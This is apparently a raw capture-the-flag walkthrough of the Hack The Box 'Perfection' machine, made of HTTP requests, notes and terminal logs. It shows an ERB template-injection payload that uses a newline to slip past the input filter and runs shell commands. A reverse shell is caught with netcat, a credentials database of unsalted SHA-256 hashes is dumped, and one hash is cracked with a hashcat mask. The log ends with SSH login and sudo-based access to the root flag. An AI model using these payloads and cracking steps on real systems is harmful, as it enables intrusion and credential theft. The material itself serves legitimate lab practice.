@@ -1,0 +1,753 @@
+POST /weighted-grade-calc HTTP/1.1
+Host: 10.10.11.253
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 403
+Origin: http://10.10.11.253
+Connection: close
+Referer: http://10.10.11.253/weighted-grade-calc
+Upgrade-Insecure-Requests: 1
+
+category1=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E&grade1=50&weight1=20&category2=%3Cscript%3Ealert%28%22test1%22%29%3C%2Fscript%3E&grade2=50&weight2=20&category3=%3Cscript%3Ealert%28%22test2%22%29%3C%2Fscript%3E&grade3=50&weight3=20&category4=%3Cscript%3Ealert%28%22test3%22%29%3C%2Fscript%3E&grade4=50&weight4=20&category5=%3Cscript%3Ealert%28%22test4%22%29%3C%2Fscript%3E&grade5=50&weight5=20
+
+
+when i tried xss on the site's calculator it says "malicious input blocked"
+
+maybe if i try it elsewhere in the request it will show?
+
+<script>alert("test")</script>
+
+in the user agent header didnt work
+
+
+
+POST /weighted-grade-calc HTTP/1.1
+Host: 10.10.11.253
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 180
+Origin: http://10.10.11.253
+Connection: close
+Referer: http://10.10.11.253/weighted-grade
+Upgrade-Insecure-Requests: 1
+
+category1=etau&grade1=50&weight1=20&category2=srtu&grade2=50&weight2=20&category3=awet&grade3=50&weight3=20&category4=aw4et&grade4=50&weight4=20&category5=eryi&grade5=50&weight5=20
+
+saving htis. this is a regular non-malicious request
+
+
+i thjihnk there is some kind of xss vuln here i just dont know where
+
+
+malicious input blocked when trying other xss methods
+
+seems like i cant exploit anything here.
+
+wait what about other xss payloads
+
+so the backend seems to be ruby based on wappalyzer
+
+
+test%0A<%25%3d+`whoami`+%25>
+
+THIS PAYLOAD WORKS --> https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+
+we can execute bash commands now heuheuhueueuuh lets try get a reverse shell >:)
+
+
+
+
+
+The expression "<%= 7/0 %>" looks like it might be written in ERB (Embedded Ruby), which is a templating system commonly used in Ruby on Rails web applications. However, the expression itself tries to divide 7 by 0, which would result in a division by zero error. Division by zero is undefined in mathematics and most programming languages, so it would typically throw an error.
+
+
+category1=test%0A<%25%3d+`ping+10.10.16.74`+%25>&grade1=50&weight1=20&category2=fdsa&grade2=50&weight2=20&category3=ertj&grade3=50&weight3=20&category4=fytuo&grade4=50&weight4=20&category5=d5&grade5=50&weight5=20
+
+was able to ping myself and got some ICMP requests in wireshark
+
+48	2024-05-11 18:44:46.663748756	10.10.11.253		10.10.16.74		ICMP	100	Echo (ping) request  id=0x0003, seq=7/1792, ttl=63 (reply in 49)
+
+
+
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/perfection]
+└─$ nc -v -n -l -p 8000
+listening on [any] 8000 ...
+connect to [10.10.16.74] from (UNKNOWN) [10.10.11.253] 38936
+bash: cannot set terminal process group (1009): Inappropriate ioctl for device
+bash: no job control in this shell
+susan@perfection:~/ruby_app$ ls
+ls
+main.rb
+public
+views
+susan@perfection:~/ruby_app$ cat main.rb
+cat main.rb
+require 'sinatra'
+require 'erb'
+set :show_exceptions, false
+
+configure do
+    set :bind, '127.0.0.1'
+    set :port, '3000'
+end
+
+get '/' do
+    index_page = ERB.new(File.read 'views/index.erb')
+    response_html = index_page.result(binding)
+    return response_html
+end
+
+get '/about' do
+    about_page = ERB.new(File.read 'views/about.erb')
+    about_html = about_page.result(binding)
+    return about_html
+end
+
+get '/weighted-grade' do
+    calculator_page = ERB.new(File.read 'views/weighted_grade.erb')
+    calcpage_html = calculator_page.result(binding)
+    return calcpage_html
+end
+
+post '/weighted-grade-calc' do
+    total_weight = params[:weight1].to_i + params[:weight2].to_i + params[:weight3].to_i + params[:weight4].to_i + params[:weight5].to_i
+    if total_weight != 100
+        @result = "Please reenter! Weights do not add up to 100."
+        erb :'weighted_grade_results'
+    elsif params[:category1] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category2] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category3] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category4] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:category5] =~ /^[a-zA-Z0-9\/ ]+$/ && params[:grade1] =~ /^(?:100|\d{1,2})$/ && params[:grade2] =~ /^(?:100|\d{1,2})$/ && params[:grade3] =~ /^(?:100|\d{1,2})$/ && params[:grade4] =~ /^(?:100|\d{1,2})$/ && params[:grade5] =~ /^(?:100|\d{1,2})$/ && params[:weight1] =~ /^(?:100|\d{1,2})$/ && params[:weight2] =~ /^(?:100|\d{1,2})$/ && params[:weight3] =~ /^(?:100|\d{1,2})$/ && params[:weight4] =~ /^(?:100|\d{1,2})$/ && params[:weight5] =~ /^(?:100|\d{1,2})$/
+        @result = ERB.new("Your total grade is <%= ((params[:grade1].to_i * params[:weight1].to_i) + (params[:grade2].to_i * params[:weight2].to_i) + (params[:grade3].to_i * params[:weight3].to_i) + (params[:grade4].to_i * params[:weight4].to_i) + (params[:grade5].to_i * params[:weight5].to_i)) / 100 %>\%<p>" + params[:category1] + ": <%= (params[:grade1].to_i * params[:weight1].to_i) / 100 %>\%</p><p>" + params[:category2] + ": <%= (params[:grade2].to_i * params[:weight2].to_i) / 100 %>\%</p><p>" + params[:category3] + ": <%= (params[:grade3].to_i * params[:weight3].to_i) / 100 %>\%</p><p>" + params[:category4] + ": <%= (params[:grade4].to_i * params[:weight4].to_i) / 100 %>\%</p><p>" + params[:category5] + ": <%= (params[:grade5].to_i * params[:weight5].to_i) / 100 %>\%</p>").result(binding)
+        erb :'weighted_grade_results'
+    else
+        @result = "Malicious input blocked"
+        erb :'weighted_grade_results'
+    end
+end
+susan@perfection:~/ruby_app$ ls
+ls
+main.rb
+public
+views
+susan@perfection:~/ruby_app$ file public
+file public
+public: directory
+susan@perfection:~/ruby_app$ cd public
+cd public
+susan@perfection:~/ruby_app/public$ ls
+ls
+css
+fonts
+images
+susan@perfection:~/ruby_app/public$ cd ..
+cd ..
+susan@perfection:~/ruby_app$ ls
+ls
+main.rb
+public
+views
+susan@perfection:~/ruby_app$ cd views
+cd views
+susan@perfection:~/ruby_app/views$ ls
+ls
+about.erb
+index.erb
+weighted_grade.erb
+weighted_grade_results.erb
+susan@perfection:~/ruby_app/views$ cd ..
+cd ..
+susan@perfection:~/ruby_app$ ls
+ls
+main.rb
+public
+views
+susan@perfection:~/ruby_app$ cd
+cd
+susan@perfection:~$ ls
+ls
+GCONV_PATH=.
+Migration
+ruby_app
+user.txt
+susan@perfection:~$ cat user.txt
+cat user.txt
+38fd8be5dc012d42286cd24d3616aec2
+susan@perfection:~$ ls
+ls
+GCONV_PATH=.
+Migration
+ruby_app
+user.txt
+susan@perfection:~$ cd
+cd
+susan@perfection:~$ ls -la
+ls -la
+total 56
+drwxr-x--- 9 susan susan 4096 May 11 03:28 .
+drwxr-xr-x 3 root  root  4096 Oct 27  2023 ..
+lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
+-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
+drwx------ 2 susan susan 4096 Oct 27  2023 .cache
+drwxrwxr-x 2 susan susan 4096 May 11 03:27 GCONV_PATH=.
+drwx------ 3 susan susan 4096 May 11 16:12 .gnupg
+lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
+drwxrwxr-x 3 susan susan 4096 Oct 27  2023 .local
+drwxr-xr-x 2 root  root  4096 Oct 27  2023 Migration
+drwxrwxr-x 2 susan susan 4096 May 11 03:27 .pkexec
+-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
+lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
+drwxr-xr-x 4 root  susan 4096 Oct 27  2023 ruby_app
+lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
+-rw-r--r-- 1 susan susan    0 Oct 27  2023 .sudo_as_admin_successful
+-rw-r----- 1 root  susan   33 May 10 16:40 user.txt
+-rw-r--r-- 1 susan susan   39 Oct 17  2023 .vimrc
+susan@perfection:~$ cd Migration
+cd Migration
+susan@perfection:~/Migration$ l
+l
+pupilpath_credentials.db
+susan@perfection:~/Migration$ ls
+ls
+pupilpath_credentials.db
+susan@perfection:~/Migration$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Oct 27  2023 .
+drwxr-x--- 9 susan susan 4096 May 11 03:28 ..
+-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
+susan@perfection:~/Migration$ python3 --version
+python3 --version
+Python 3.10.12
+susan@perfection:~/Migration$ python3 -m http.server 4444 
+python3 -m http.server 4444
+^C
+                                                                             
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/perfection]
+└─$ nc -v -n -l -p 8000
+listening on [any] 8000 ...
+connect to [10.10.16.74] from (UNKNOWN) [10.10.11.253] 43098
+bash: cannot set terminal process group (1009): Inappropriate ioctl for device
+bash: no job control in this shell
+susan@perfection:~/ruby_app$ l;s
+l;s
+main.rb  public/  views/
+s: command not found
+susan@perfection:~/ruby_app$ ls
+ls
+main.rb
+public
+views
+susan@perfection:~/ruby_app$ cd 
+cd 
+susan@perfection:~$ ls
+ls
+GCONV_PATH=.
+Migration
+ruby_app
+user.txt
+susan@perfection:~$ cd Migration
+cd Migrationl
+susan@perfection:~/Migration$ s
+ls
+pupilpath_credentials.db
+susan@perfection:~/Migration$ cat pupilpath_credentials.db
+cat pupilpath_credentials.db
+��^�ableusersusersCREATE TABLE users (
+id INTEGER PRIMARY KEY,
+name TEXT,
+password TEXT
+a�\
+Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O!Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+susan@perfection:~/Migration$ 
+
+susan@perfection:~/Migration$ 
+
+
+these seem to be password hashes
+
+the server had ssh enabled so perhaps these are the passwords of the users on the system?
+
+
+
+the passwords are hashed with 	SHA2-256 and are unsalted meaning we can just crack them without any extra values to know
+
+hashcat -m 1400 susan_miller_hash -a 3
+
+i tried cracking it with no success.
+keeps saying its exhausted.
+
+maybe susan's files has more clues?
+
+
+
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/perfection]
+└─$ nc -v -n -l -p 8000                   
+listening on [any] 8000 ...
+connect to [10.10.16.74] from (UNKNOWN) [10.10.11.253] 54664
+bash: cannot set terminal process group (1009): Inappropriate ioctl for device
+bash: no job control in this shell
+susan@perfection:~/ruby_app$ ls
+ls
+main.rb
+public
+views
+susan@perfection:~/ruby_app$ cd 
+cd 
+susan@perfection:~$ ls
+ls
+GCONV_PATH=.
+Migration
+ruby_app
+user.txt
+susan@perfection:~$ cd /var
+cd /var
+susan@perfection:/var$ ls
+ls
+backups
+cache
+crash
+lib
+local
+lock
+log
+mail
+opt
+run
+spool
+tmp
+www
+susan@perfection:/var$ cd mail 
+cd mail
+susan@perfection:/var/mail$ ls
+ls
+susan
+susan@perfection:/var/mail$ cd susan
+cd susanl
+bash: cd: susan: Not a directory
+susan@perfection:/var/mail$ s
+ls
+susan
+susan@perfection:/var/mail$ cat susan
+cat susan
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
+susan@perfection:/var/mail$ 
+
+
+yes there are...
+
+lets crack it now
+
+hashcat -m 1400 susan_miller_hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
+susan_nasus_413759210
+
+
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/perfection]
+└─$ hashcat -m 1400 susan_miller_hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d  
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-penryn-13th Gen Intel(R) Core(TM) i7-13700F, 6747/13558 MB (2048 MB allocatable), 10MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Brute-Force
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).                                                                            
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1400 (SHA2-256)
+Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
+Time.Started.....: Sun May 12 00:56:21 2024 (4 mins, 36 secs)
+Time.Estimated...: Sun May 12 01:00:57 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1179.9 kH/s (1.62ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 324567040/1000000000 (32.46%)
+Rejected.........: 0/324567040 (0.00%)
+Restore.Point....: 324556800/1000000000 (32.46%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: susan_nasus_126824210 -> susan_nasus_700440610
+Hardware.Mon.#1..: Util: 25%
+
+Started: Sun May 12 00:56:20 2024
+Stopped: Sun May 12 01:00:58 2024
+                                                                             
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/perfection]
+└─$                    
+
+
+
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/perfection]
+└─$ ssh susan@10.10.11.253                                               
+The authenticity of host '10.10.11.253 (10.10.11.253)' can't be established.
+ED25519 key fingerprint is SHA256:Wtv7NKgGLpeIk/fWBeL2EmYo61eHT7hcltaFwt3YGrI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.253' (ED25519) to the list of known hosts.
+susan@10.10.11.253's password: 
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Sun May 12 05:03:28 AM UTC 2024
+
+  System load:           1.0205078125
+  Usage of /:            75.1% of 5.80GB
+  Memory usage:          23%
+  Swap usage:            0%
+  Processes:             277
+  Users logged in:       1
+  IPv4 address for eth0: 10.10.11.253
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:aea2
+
+  => There are 4 zombie processes.
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+4 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+You have mail.
+Last login: Sat May 11 05:39:34 2024 from 10.10.14.53
+susan@perfection:~$ ls
+'GCONV_PATH=.'   Migration   ruby_app   user.txt
+susan@perfection:~$ sudo -l
+[sudo] password for susan: 
+Matching Defaults entries for susan on perfection:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User susan may run the following commands on perfection:
+    (ALL : ALL) ALL
+susan@perfection:~$ cd
+susan@perfection:~$ cd root
+-bash: cd: root: No such file or directory
+susan@perfection:~$ cd /
+susan@perfection:/$ cd root
+-bash: cd: root: Permission denied
+susan@perfection:/$ sudo cd root
+sudo: cd: command not found
+sudo: "cd" is a shell built-in command, it cannot be run directly.
+sudo: the -s option may be used to run a privileged shell.
+sudo: the -D option may be used to run a command in a specific directory.
+susan@perfection:/$ ^C root
+susan@perfection:/$ sudo
+usage: sudo -h | -K | -k | -V
+usage: sudo -v [-ABknS] [-g group] [-h host] [-p prompt] [-u user]
+usage: sudo -l [-ABknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
+            [command]
+usage: sudo [-ABbEHknPS] [-r role] [-t type] [-C num] [-D directory] [-g
+            group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u
+            user] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-ABknS] [-r role] [-t type] [-C num] [-D directory] [-g
+            group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u
+            user] file ...
+susan@perfection:/$ ls -l
+total 60
+lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
+drwxr-xr-x   3 root root  4096 Feb 26 09:36 boot
+drwxr-xr-x  19 root root  3980 May 10 16:40 dev
+drwxr-xr-x 104 root root  4096 Feb 26 09:27 etc
+drwxr-xr-x   3 root root  4096 Oct 27  2023 home
+lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
+drwx------   2 root root 16384 Feb 27  2023 lost+found
+drwxr-xr-x   2 root root  4096 Oct 27  2023 media
+drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
+drwxr-xr-x   2 root root  4096 Oct 27  2023 opt
+dr-xr-xr-x 338 root root     0 May 10 16:39 proc
+drwx------   4 root root  4096 May 11 05:38 root
+drwxr-xr-x  28 root root   860 May 12 05:03 run
+lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
+dr-xr-xr-x  13 root root     0 May 10 16:39 sys
+drwxrwxrwt  15 root root  4096 May 12 04:50 tmp
+drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
+drwxr-xr-x  13 root root  4096 Oct 27  2023 var
+susan@perfection:/$ su root
+Password: 
+su: Authentication failure
+susan@perfection:/$ ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
+boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
+susan@perfection:/$ cd root
+-bash: cd: root: Permission denied
+susan@perfection:/$ sudo chmod +4 root
+susan@perfection:/$ ls -l
+total 60
+lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
+drwxr-xr-x   3 root root  4096 Feb 26 09:36 boot
+drwxr-xr-x  19 root root  3980 May 10 16:40 dev
+drwxr-xr-x 104 root root  4096 Feb 26 09:27 etc
+drwxr-xr-x   3 root root  4096 Oct 27  2023 home
+lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
+drwx------   2 root root 16384 Feb 27  2023 lost+found
+drwxr-xr-x   2 root root  4096 Oct 27  2023 media
+drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
+drwxr-xr-x   2 root root  4096 Oct 27  2023 opt
+dr-xr-xr-x 338 root root     0 May 10 16:39 proc
+drwx---r--   4 root root  4096 May 11 05:38 root
+drwxr-xr-x  28 root root   860 May 12 05:03 run
+lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
+dr-xr-xr-x  13 root root     0 May 10 16:39 sys
+drwxrwxrwt  15 root root  4096 May 12 04:50 tmp
+drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
+drwxr-xr-x  13 root root  4096 Oct 27  2023 var
+susan@perfection:/$ cd root
+-bash: cd: root: Permission denied
+susan@perfection:/$ sudo chmod 777 root
+susan@perfection:/$ ls
+bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
+boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
+susan@perfection:/$ ls -l
+total 60
+lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
+drwxr-xr-x   3 root root  4096 Feb 26 09:36 boot
+drwxr-xr-x  19 root root  3980 May 10 16:40 dev
+drwxr-xr-x 104 root root  4096 Feb 26 09:27 etc
+drwxr-xr-x   3 root root  4096 Oct 27  2023 home
+lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
+drwx------   2 root root 16384 Feb 27  2023 lost+found
+drwxr-xr-x   2 root root  4096 Oct 27  2023 media
+drwxr-xr-x   2 root root  4096 Feb 17  2023 mnt
+drwxr-xr-x   2 root root  4096 Oct 27  2023 opt
+dr-xr-xr-x 338 root root     0 May 10 16:39 proc
+drwxrwxrwx   4 root root  4096 May 11 05:38 root
+drwxr-xr-x  28 root root   860 May 12 05:03 run
+lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Feb 17  2023 srv
+dr-xr-xr-x  13 root root     0 May 10 16:39 sys
+drwxrwxrwt  15 root root  4096 May 12 04:50 tmp
+drwxr-xr-x  14 root root  4096 Feb 17  2023 usr
+drwxr-xr-x  13 root root  4096 Oct 27  2023 var
+susan@perfection:/$ cd root
+susan@perfection:/root$ ls
+message.sh  root.txt
+susan@perfection:/root$ cat root.txt
+cat: root.txt: Permission denied
+susan@perfection:/root$ ls -l
+total 8
+-rwxr-xr-x 1 root root 3350 May 11 05:38 message.sh
+-rw-r----- 1 root root   33 May 10 16:40 root.txt
+susan@perfection:/root$ sudo chmod 777 root.txt
+chmod: changing permissions of 'root.txt': Operation not permitted
+susan@perfection:/root$ cat message.sh
+#!/bin/bash
+
+# Get the script's PID
+SCRIPT_PID=$$
+
+# Function to handle SIGINT signal
+sigint_handler() {
+    echo "Exiting..."
+    exit 1
+}
+
+# Function for error handling
+handle_error() {
+    local error_message="$1"
+    echo "Error: $error_message"
+}
+
+# Sanitize function to remove unwanted characters
+sanitize() {
+    local input="$1"
+    sanitized=$(echo "$input" | sed 's/[^[:alnum:]!_@#/$%,^*?.[:space:]\\]//g')
+    echo "$sanitized"
+}
+
+# Check if a PID belongs to the script itself
+is_script_pid() {
+    local pid="$1"
+    [ "$pid" -eq "$SCRIPT_PID" ] && return 0 || return 1
+}
+
+# Generate random string
+CHARSET="0123456789abcdefABCDEF"
+generate_string() {
+    local length=$1
+    tr -dc "$CHARSET" < /dev/urandom | head -c $length
+}
+LENGTH=50
+
+# Trap SIGINT signal and call the handler function
+trap sigint_handler SIGINT
+
+# Initialize command option
+command_option="echo"
+message=""
+
+# Check if -c flag is provided and set the command option accordingly
+if [ "$1" = "-c" ]; then
+    c_flag="true"
+    command_option=''
+fi
+
+# Check if --spam flag is provided and set the command option accordingly
+if [ "$1" = "--spam" ]; then
+    spam="true"
+    echo "$spam"
+    shift
+fi
+
+echo "Script PID: $SCRIPT_PID"
+
+while true; do
+    # Prompt user for message if not spam mode, command is not set to "echo", and message is not set
+    if [ "$spam" != "true" ]  && [ -z "$message" ]; then
+        read -p "Enter a message/code to send: " message
+    fi
+    
+    if [ "$spam" != "true" ] && [ -z "$message" ]; then
+        handle_error "Message cannot be empty"
+        continue
+    fi
+
+    if [ "$spam" = "true" ]; then
+        message=$(generate_string $LENGTH)
+    fi
+
+    sanitized_message=$(sanitize "$message")
+    
+    if [ -z "$sanitized_message" ]; then
+        handle_error "Sanitized message is empty"
+        continue
+    fi
+
+    echo "The command for gdb will look like: call system(\"$command_option $sanitized_message\")"
+
+    # Get the list of PIDs for non-root processes excluding the script's PID
+    pids=$(ps -e -o pid,user,cmd | grep -E '(/bin/)?(bash|ssh|sh|zsh|fish|tcsh|csh|dash|ksh|ash|zsh|rc|sash|scsh|esh|psh|posh)'| grep -v 'root' | grep -v grep | awk '{print $1}')
+
+    if [ -z "$pids" ]; then
+        handle_error "No matching processes found"
+        sleep 5
+        continue
+    fi
+
+    # Filter out the script's PID from the list of PIDs
+    filtered_pids=""
+    for pid in $pids; do
+        if ! is_script_pid "$pid"; then
+            filtered_pids+="$pid "
+        fi
+    done
+
+    if [ -z "$filtered_pids" ]; then
+        handle_error "No matching processes found (excluding script's PID)"
+        sleep 5
+        continue
+    fi
+    
+    # Iterate over filtered PIDs
+    for pid in $filtered_pids; do
+        # Execute GDB commands only if sanitized message is not empty
+        if [ -n "$sanitized_message" ]; then
+            gdb -p $pid >/dev/null 2>&1 <<EOF &
+
+                call system("$command_option $sanitized_message")
+                quit
+EOF
+
+            if [ $? -ne 0 ]; then
+                handle_error "Failed to send message to pid $pid"
+            else
+                echo "Message sent to pid $pid"
+            fi
+            
+            if [ "$spam" = "true" ]; then
+                sleep 0.1
+            fi
+        fi
+    done
+
+    # Reset message for the next iteration
+    message=""
+done
+susan@perfection:/root$ ls
+message.sh  root.txt
+susan@perfection:/root$ cat root.txt
+cat: root.txt: Permission denied
+susan@perfection:/root$ sudo cat root.txt
+208f48ef9594658e90f86d495e327395
+susan@perfection:/root$ 
